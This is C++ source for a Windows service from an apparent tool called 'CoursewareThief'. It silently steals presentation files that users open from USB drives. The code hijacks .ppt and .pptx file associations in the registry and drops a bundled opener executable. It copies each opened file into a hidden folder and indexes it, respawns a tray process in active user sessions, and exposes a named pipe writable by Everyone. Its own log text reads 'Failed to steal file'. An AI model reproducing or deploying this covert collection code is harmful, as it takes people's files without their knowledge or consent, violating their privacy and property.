#include <Windows.h>
#include "../../resource/tool.h"
#include "service.h"
#include <unordered_set>
#include <accctrl.h>
#include <aclapi.h>
#include <json/json.h>
#include "resource.h"
using namespace std;



extern HINSTANCE hInst;


wstring szSvcName;

static unordered_set<wstring> processingFiles;

static std::map<wstring, std::any> service_config;
template<typename Ty>
static Ty GetServiceConfigAsType(wstring key, Ty defaultValue = (Ty())) {
	try {
		auto& value = service_config.at(key);
		return std::any_cast<Ty>(value);
	}
	catch (...) {
		return defaultValue;
	}
}



static DWORD WINAPI UserTrayProcessWatchdog(PVOID psessionid) {
	DWORD sessionid = (DWORD)(LONG_PTR)psessionid;
	HANDLE hToken = NULL;
	STARTUPINFO si{}; PROCESS_INFORMATION pi{};
	WCHAR szCmdLine[1024]{};
	while (1) {
		//����û��Ƿ��ڵ�¼��ͨ��Token��
		if (!WTSQueryUserToken(sessionid, &hToken)) {
			if (hToken) CloseHandle(hToken);
			break; // �û�ע��, etc.
		}
		if (hToken) CloseHandle(hToken);

		wcscpy_s(szCmdLine, (L"cwtui.exe --type=tray --service-name=\"" +
			szSvcName + L"\"").c_str());
		if (!Process.StartAsActiveUserT(L"cwtui.exe", szCmdLine, 0, 0,
			FALSE, 0, 0, 0, &si, &pi)) {
			// ���̴���ʧ��
			return GetLastError();
		}
		CloseHandle(pi.hThread);
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		Sleep(1000);
	}

	return 0;
}



static DWORD WINAPI UserSessionIdWatcher(PVOID) {
	std::unordered_set<DWORD> createdIds;

	while (true) {
		DWORD dwSessionID = WTSGetActiveConsoleSessionId();
		if (dwSessionID != 0) {
			if (!createdIds.contains(dwSessionID)) {
				HANDLE hThread = CreateThread(0, 0, UserTrayProcessWatchdog,
					(PVOID)(LONG_PTR)dwSessionID, 0, 0);
				if (hThread) {
					CloseHandle(hThread);
					createdIds.insert(dwSessionID);
				}
			}
		}
		Sleep(10000);
	}

	return 0;
}



static DWORD WINAPI FileAssocChanger(PVOID) {

	HKEY hk = NULL;
	wstring originalOpenType;

	if (!file_exists("PPTX.exe"))
	if (!FreeResFile(IDR_BIN_PPTXOPENER, L"BIN", L"PPTX.exe"))
		return GetLastError();
	wstring cmd = L"\"" + GetProgramPathW() + L"PPTX.exe\" \"%1\"";

#if 0
	// �Ϸ�����ֱ���޸Ĵ򿪷�ʽ
	// ȱ�㣺�ᱻPOWERPNT���
	RegOpenKeyExW(HKEY_CLASSES_ROOT, L".pptx", 0, KEY_READ | KEY_WRITE, &hk);
	if (!hk) return -1;
	MyQueryRegistryValue(hk, L"", L"CoursewareThiefOriginalValue", originalOpenType);
	if (originalOpenType.empty()) {
		MyQueryRegistryValue(hk, L"", L"", originalOpenType);
		MySetRegistryValue(hk, L"", L"CoursewareThiefOriginalValue", originalOpenType);
		MySetRegistryValue(hk, L"", L"", L"CoursewareThief.PPTX");
	}
	RegCloseKey(hk);
#else
	// �·������޸�OpenWithProgids
	{
		RegCreateKeyExW(HKEY_CLASSES_ROOT, L".pptx"
			"\\OpenWithProgids", 0, NULL, 0,
			KEY_READ | KEY_WRITE, NULL, &hk, NULL);
		if (hk) RegCloseKey(hk);
		bool result = MySetRegistryValue(HKEY_CLASSES_ROOT, L".pptx"
			"\\OpenWithProgids", L"CoursewareThief.PPTX", cmd);
	}
#endif

#if 0
	RegOpenKeyExW(HKEY_CLASSES_ROOT, L".ppt", 0, KEY_READ | KEY_WRITE, &hk);
	if (!hk) return -1;
	MyQueryRegistryValue(hk, L"", L"CoursewareThiefOriginalValue", originalOpenType);
	if (originalOpenType.empty()) {
		MyQueryRegistryValue(hk, L"", L"", originalOpenType);
		MySetRegistryValue(hk, L"", L"CoursewareThiefOriginalValue", originalOpenType);
		MySetRegistryValue(hk, L"", L"", L"CoursewareThief.PPTX");
	}
	RegCloseKey(hk);
#else
	// ͬ��

	{
		RegCreateKeyExW(HKEY_CLASSES_ROOT, L".ppt"
			"\\OpenWithProgids", 0, NULL, 0,
			KEY_READ | KEY_WRITE, NULL, &hk, NULL);
		if (hk) RegCloseKey(hk);
		bool result = MySetRegistryValue(HKEY_CLASSES_ROOT, L".ppt"
			"\\OpenWithProgids", L"CoursewareThief.PPTX", cmd);
	}
#endif

	{
		RegCreateKeyExW(HKEY_CLASSES_ROOT, L"CoursewareThief.PPTX\\"
			L"shell\\open\\command", 0, NULL, 0,
			KEY_READ | KEY_WRITE, NULL, &hk, NULL);
		if (hk) RegCloseKey(hk);
		bool result = MySetRegistryValue(HKEY_CLASSES_ROOT, L"CoursewareThief.PPTX\\"
			L"shell\\open\\command", L"", cmd);
		//fstream fp("app.log", ios::app);
		//fp << "result: " << result << endl;
	}


	return 0;
}


bool ShellOpenCourseware(wstring file, DWORD session) {
	wstring cmdLine = L"cwtshell --type=user-shell-open-file --file=\""
		+ file + L"\"";
	STARTUPINFO si{}; PROCESS_INFORMATION pi{};
	(void)Process.StartAsUserT(session, (GetProgramDirW() + L"\\..\\cwtshell.exe")
		.c_str(), (LPTSTR)cmdLine.c_str(), NULL, NULL, FALSE, 0, 0, 0, &si, &pi);
	if (pi.hThread) CloseHandle(pi.hThread);
	if (pi.hProcess) CloseHandle(pi.hProcess);
	return !!pi.dwProcessId;
}


#include "cwdef.h"




static bool IsRemovableDrive(const std::wstring& disk) {
	UINT driveType = GetDriveTypeW(disk.c_str());

	// ���Ƴ��Ĵ���������ͨ����U��  
	if (driveType == DRIVE_REMOVABLE) {
		return true;
	}

	return false;
}
int __stdcall ServiceFileCopyWorker(CmdLineW& cl) {
	/*
	cmdline example:

	DWORD retCode = Process.StartAndWait(L"cwtcopy --type=service-worker"
		" --function=file-copy --is-not-javascript-service-worker "
		"--source=\"" + cw + L"\" --destination=\"" + targetFile +
		L"\" --write-pipe=\"" + pipeName + L"\" --exit-signal=//TODO");
	*/
	wstring src, dest;
	cl.getopt(L"source", src); cl.getopt(L"destination", dest);

	if (src.empty() || dest.empty()) return ERROR_INVALID_PARAMETER;

	BOOL result = CopyFileW(src.c_str(), dest.c_str(), FALSE);
	if (result) return GetLastError();

	return 0;
}
static bool OpenCoursewareFromNamedPipe(HANDLE hPipe, wstring cw) {
	if (cw.empty()) return false;

	auto direct = [&] {
		processingFiles.erase(cw);
		DWORD sessionID = WTSGetActiveConsoleSessionId();
		GetNamedPipeClientSessionId(hPipe, &sessionID);
		return ShellOpenCourseware(cw, sessionID);
	};

	if (processingFiles.contains(cw)) return true; // ֱ�ӷ���
	processingFiles.insert(cw);

	// �ж��ļ��Ƿ���U����
	wstring disk = cw[0] + L":\\";
	if (GetServiceConfigAsType<bool>(L"cw.steal.fromEverywhere") == false
		&& !IsRemovableDrive(disk)
	) {
		// ֱ�Ӵ�
		return direct();
	}

	// �ļ���U����
	auto size = MyGetFileSizeW(cw);
	if (size > GetServiceConfigAsType<ULONGLONG>(L"cw.steal.maxSize",
		ULONGLONG(1024) * 1024 * 1024)) { // 1GB
		// ֱ�Ӵ�
		return direct();
	}
	FILETIME modifyTime{};
	ULARGE_INTEGER nModTime{};
	HANDLE hFile = CreateFileW(cw.c_str(), GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return direct();
	}
	GetFileTime(hFile, NULL, &modifyTime, NULL);
	CloseHandle(hFile);

	nModTime.LowPart = modifyTime.dwLowDateTime;
	nModTime.HighPart = modifyTime.dwHighDateTime;
	if (cw.length() < cw.find(L"\\")) return direct();
	wstring file_name = cw.substr(cw.find_last_of(L"\\") + 1);
	wstring cwid = GenerateUUIDW();
	wstring targetFolderName = cwid;
	CwIndexData_LoadFileData();
	vector<CwIndex_MetaData> meta;
	if (CwIndexData_GetFileData(cw, meta)) {
		auto cwsize = MyGetFileSizeW(cw);
		for (auto& i : meta) {
			if (i.file_modify_time == nModTime.QuadPart && i.fileSize == cwsize) {
				// ͵����
				wstring targetFile = GetProgramPathW() + L"Files\\" +
					i.fileId + L"\\" + file_name;
				DWORD sessionID = WTSGetActiveConsoleSessionId();
				GetNamedPipeClientSessionId(hPipe, &sessionID);
				processingFiles.erase(cw);
				return ShellOpenCourseware(targetFile, sessionID);
			}
		}
	}

	wstring targetFile = L"Files\\" + targetFolderName + L"\\" + file_name;
	targetFile = GetProgramPathW() + targetFile;

#if 0
	if (0 && file_exists(L"Files/" + targetFolderName) &&
		file_exists(targetFile)) {
		// ͵����
		DWORD sessionID = WTSGetActiveConsoleSessionId();
		GetNamedPipeClientSessionId(hPipe, &sessionID);
		return ShellOpenCourseware(targetFile, sessionID);
	}
#endif

	// ͵��
	// TODO: ��ʾ͵ȡ����

	CreateDirectoryW((L"Files/" + targetFolderName).c_str(), NULL);
	wstring pipeName = L"\\\\.\\pipe\\" + cwid;
	wstring cmdLine = L"cwtcopy --type=service-worker"
		" --function=file-copy --is-not-javascript-service-worker "
		"--source=\"" + cw + L"\" --destination=\"" + targetFile +
		L"\" --write-pipe=\"" + pipeName + L"\" --exit-signal=//TODO";
	DWORD retCode = [&] {
		STARTUPINFO si{}; PROCESS_INFORMATION pi{};
		si.cb = sizeof(si);
		PWSTR lpCommandLine = new wchar_t[cmdLine.length() + 1];
		wcscpy_s(lpCommandLine, cmdLine.length() + 1, cmdLine.c_str());
		if (!CreateProcessW(NULL, lpCommandLine, NULL, NULL, TRUE,
			CREATE_SUSPENDED | HIGH_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
			return GetLastError();
		}
		DWORD dwRet = 0;
		ResumeThread(pi.hThread);
		CloseHandle(pi.hThread);
		WaitForSingleObject(pi.hProcess, INFINITE);
		GetExitCodeProcess(pi.hProcess, &dwRet);
		CloseHandle(pi.hProcess);
		return dwRet;
	}();
	//CopyFileW(cw.c_str(), targetFile.c_str(), FALSE);
	if (retCode != 0) {
		// ͵ȡʧ����...
		fstream fp(L"error.log", ios::app);
		fp << "[" << time(0) << "]" << "Failed to steal file: " << ws2s(cw) <<
			" |to| " << ws2s(targetFile) << " , code=" << retCode << endl;
		fp.close();

		return direct();
	}

	FILETIME currentTime{};
	GetSystemTimeAsFileTime(&currentTime);
	ULARGE_INTEGER currentTimeInt{};
	currentTimeInt.LowPart = currentTime.dwLowDateTime;
	currentTimeInt.HighPart = currentTime.dwHighDateTime;
	CwIndexData_InsertItem(cw, cwid, currentTimeInt.QuadPart, nModTime.QuadPart);

	if (file_exists(L"Files/" + targetFolderName) &&
		file_exists(targetFile)) {
		processingFiles.erase(cw);
		// ��
		DWORD sessionID = WTSGetActiveConsoleSessionId();
		GetNamedPipeClientSessionId(hPipe, &sessionID);
		return ShellOpenCourseware(targetFile, sessionID);
	}
	else return direct();

	return true;
}



// Function to handle a client connection  
static void __stdcall OpenerPipe_ClientHandler(void* pParam) {
	HANDLE hPipe = (HANDLE)pParam;
	WCHAR buffer[2048]{};
	DWORD bytesRead = 0;
	BOOL result = ReadFile(hPipe, buffer, sizeof(buffer) - 2, &bytesRead, NULL);
	if (result && bytesRead > 0) {
		// use buffer
#if 0
		wchar_t title[] = L"server"; DWORD resp = 0;
		WTSSendMessageW(WTS_CURRENT_SERVER, WTSGetActiveConsoleSessionId(),
			title, 12, buffer, bytesRead, MB_ICONINFORMATION, 0, &resp, 0);
		CopyFileExW;
#endif
		;

		wstring str;
		str = OpenCoursewareFromNamedPipe(hPipe, buffer) ?
			L"success" : to_wstring(GetLastError());

		// Send the data back to the client  
		DWORD bytesWritten;
		WriteFile(hPipe, str.c_str(), DWORD((str.length() + 1) * 2), &bytesWritten, NULL);
	}
	else {
		/*std::cerr << "ReadFile failed with error: "
			<< GetLastError() << std::endl;*/
	}

	DisconnectNamedPipe(hPipe);
	CloseHandle(hPipe);
	_endthread();
	return;
}
static DWORD WINAPI GlobalOpenerPipe(PVOID) {
	WCHAR pipeName[256]{};
	if (!LoadStringW(hInst, IDS_STRING_SERVICE_NAMEDPIPE_NAME,
		pipeName, 256)) return GetLastError();
	HANDLE hPipe;
	SECURITY_ATTRIBUTES sa{ 0 };
	SECURITY_DESCRIPTOR sd{ 0 };
	{
		SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;
		PSID pSid = NULL;
		AllocateAndInitializeSid(&sia, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid); // Everyone
		BYTE buf[0x400] = { 0 };
		PACL pAcl = (PACL)&buf;
		InitializeAcl(pAcl, 1024, ACL_REVISION);
		AddAccessAllowedAce(pAcl, ACL_REVISION,
			GENERIC_READ | GENERIC_WRITE | READ_CONTROL, pSid);
		InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
		SetSecurityDescriptorDacl(&sd, TRUE, (PACL)pAcl, FALSE);
		sa.nLength = (DWORD)sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = (LPVOID)&sd;
		sa.bInheritHandle = TRUE;
		FreeSid(pSid);
	}

	while (true) { // Loop to accept multiple connections  
		hPipe = CreateNamedPipeW(
			pipeName,
			PIPE_ACCESS_DUPLEX,
			PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
			64,
			1024, 1024, 0, &sa
		);

		if (hPipe == INVALID_HANDLE_VALUE || !hPipe) {
			DWORD err = GetLastError();
			fstream fp("error.log", ios::app);
			fp << "[" << time(0) << "] " << "CreateNamedPipe "
				"failed with error: " << err << "while pipe name is: " <<
				ws2s(pipeName) << std::endl;
			fp.close();
			Sleep(1000); // Wait for a second and retry
			continue;
		}


		ConnectNamedPipe(hPipe, NULL);
		//std::cout << "Client connected to the named pipe." << std::endl;

		// Start a new thread to handle the client  
		unsigned threadID = 0;
		_beginthread(OpenerPipe_ClientHandler, 0, (void*)hPipe);
	}

	return 0;
}


static void LoadServiceConfig() {
	if ((!file_exists("config.json")) ||
		MyGetFileSizeW(L"config.json") > 16 * 1024 * 1024 // config too large
		) {
		fstream fp("config.json", ios::out);
		fp << "{}";
		fp.close();
	}
	HANDLE hFile = CreateFileW(L"config.json", GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_ALWAYS, NULL, NULL);
	string allTexts; // UTF8 string
	if (hFile != INVALID_HANDLE_VALUE && hFile) {
		char buffer[4096]{}; DWORD r = 0;
		while (ReadFile(hFile, buffer, 4096, &r, 0)) {
			if (!r) break;
			allTexts += buffer;
			if (allTexts.size() > 16 * 1024 * 1024) break; // string too long
		}
		CloseHandle(hFile);
	}

	try {
		// ����JSON�ַ���  
		Json::Reader reader;
		Json::Value root;
		if (!reader.parse(allTexts, root)) {
			// ����ʧ�ܣ����������Ϣ  
			//std::cerr << "Failed to parse JSON: " <<
			//	reader.getFormattedErrorMessages() << std::endl;
			//return false;
		}

		// ����JSON�������service_config  
		if (root.isObject()) {
			for (Json::Value::iterator it = root.begin(); it != root.end(); ++it) {
				std::string key = it.key().asString();
				std::any value;
				if (it->type() == Json::stringValue) {
					// string
					string str = it->asString();
					value = ConvertUTF8ToUTF16(str);
				}
				else if (it->type() == Json::booleanValue) {
					// bool
					value = it->asBool();
				}
				else if (it->type() == Json::intValue) {
					// int
					value = it->asInt64();
				}
				else if (it->type() == Json::uintValue) {
					// uint
					value = it->asUInt64();
				}
				else if (it->type() == Json::realValue) {
					// double
					value = it->asDouble();
				}
				else if (it->type() == Json::nullValue) {
					// nullptr
					value = nullptr;
				}
				else continue;

				// ������ֵת���ؿ��ַ���  
				std::wstring wideKey = ConvertUTF8ToUTF16(key);

				// �洢��ȫ�ֱ�����  
				service_config[wideKey] = value;
			}
		}
		else {
			// ���ڵ㲻�Ƕ���JSON��ʽ����  
			//std::cerr << "Root is not a JSON object." << std::endl;
			//return false;
		}

	}
	catch (std::exception) {
		// ��������쳣��Ϣ  
		//std::cerr << "Exception parsing JSON: " << e.what() << std::endl;
		//return false;
	}

}


constexpr LPTHREAD_START_ROUTINE workerThreads[] = {
	UserSessionIdWatcher,
	GlobalOpenerPipe,
	FileAssocChanger,
};
constexpr size_t workerThreadsCount =
	sizeof(workerThreads) / sizeof(LPTHREAD_START_ROUTINE);
HANDLE hServiceWorkerThreads[min(32, workerThreadsCount)] = {};
#define checkFile(x) \
	if (file_exists(x)) DeleteFileW(x); \
	CopyFileW(GetProgramDirW().c_str(), x, FALSE);
DWORD WINAPI srv_main(PVOID) {
	EnableAllPrivileges();

	checkFile(L"cwtui.exe");
	checkFile(L"cwtshell.exe");
	checkFile(L"cwtcopy.exe");

	if (IsFileOrDirectory(L"Files") != -1) {
		if (IsFileOrDirectory(L"Files") == 1) RemoveDirectoryW(L"Files");
		CreateDirectoryW(L"Files", NULL);
		SetFileAttributesW(L"Files", FILE_ATTRIBUTE_HIDDEN);
	}

	LoadServiceConfig();

	AutoZeroMemory(hServiceWorkerThreads);

	for (size_t i = 0; i < workerThreadsCount; ++i) {
		hServiceWorkerThreads[i] =
			CreateThread(0, 0, workerThreads[i], 0, 0, 0);
		if (!hServiceWorkerThreads[i]) {
			return GetLastError();
		}
	}


	WaitForMultipleObjects(workerThreadsCount,
		hServiceWorkerThreads, TRUE, INFINITE);
	for (size_t i = 0; i < workerThreadsCount; ++i)
		if (hServiceWorkerThreads[i]) CloseHandle(hServiceWorkerThreads[i]);

	return 0;
}


